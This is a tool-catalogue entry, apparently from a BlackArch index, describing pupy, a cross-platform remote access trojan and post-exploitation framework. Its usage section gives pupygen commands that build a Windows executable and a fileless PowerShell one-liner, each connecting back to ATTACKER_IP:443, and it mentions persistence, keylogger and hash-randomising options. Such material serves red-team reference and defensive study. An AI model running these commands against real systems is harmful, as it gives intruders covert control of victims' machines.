---
name: "pupy"
categories:
  - blackarch-automation
version: "2988.4b78dc58"
homepage: "https://github.com/n1nj4sec/pupy"
packaged-by: [blackarch]
blackarch-builddate: "2019-03-31"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "n1nj4sec/pupy"
github-stars: 9005
github-pushed: "2024-03-22"
github-archived: true
github-issues: 176
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pupy

> n1nj4sec's cross-platform RAT and post-exploitation framework (Windows/Linux/macOS/Android): memory-resident Python implants that connect back over your choice of transport, with process migration, remote Python code loading and a rich module console.

## What it's for

Maintaining control after a foothold across mixed operating systems. A Pupy implant runs entirely in memory (low footprint, nothing on disk), can migrate into other processes via reflective injection, and — its signature trick — can load remote Python code, packages and C extensions from memory on the controlled host, which makes post-exploitation modules feel like scripting the target. Sessions speak several transports (ssl, http, rsa, obfs3, scramblesuit), support connect or bind launchers, and payloads are built as PE executables, reflective DLLs, pure Python, PowerShell one-liners or APKs, with "scriptlets" (persistence, keylogger, sandbox detection) embedded to run offline before the session even opens. Operation is two commands: `pupygen` builds payloads and `pupysh` is the multi-session console. Status: the original n1nj4sec repository is archived (final activity 2024) and the packaged build is the Python 2 lineage — it still runs, but for anything current treat it as legacy and expect modern EDR to react to its injection techniques. Not to be confused with actively maintained community forks.

*No corpus evidence — derived from upstream documentation and source.*

## Typical use cases

### Generate a payload for your target platform

```
pupygen -f exe -O windows connect --host ATTACKER_IP:443 -t ssl
```

Outcome: builds a Windows PE executable that, when run, connects back to ATTACKER_IP:443 over the ssl transport; a file named for the format/host lands in the current directory. `-l` with no other arguments lists every available format, transport, scriptlet and option so you can pick combinations (e.g. `-s persistence -s keylogger` embeds scriptlets, `--randomize-hash` appends junk so the binary's hash is unpredictable).

### Run the command console for live sessions

```
pupysh
```

Outcome: opens the interactive multi-session console (with tab completion). As implants check in they appear in the sessions list; from there you select sessions and run Pupy's post-exploitation modules — because the implant loads remote Python, modules execute in-memory on the target (shell, file operations, process migration, and more).

### Deliver without dropping a file

Use one of the one-liner output formats instead of a binary:

```
pupygen -f ps1_oneliner -O windows connect --host ATTACKER_IP:443 -t http
```

Outcome: emits a PowerShell one-liner that loads the implant straight into memory when pasted/executed on the target — nothing written to disk, with the oneliner's listener port controllable via `--oneliner-listen-port` (default 8080). Run `pupygen -l` to see the exact one-liner format names available in your build (PowerShell and Python variants exist) and their requirements.
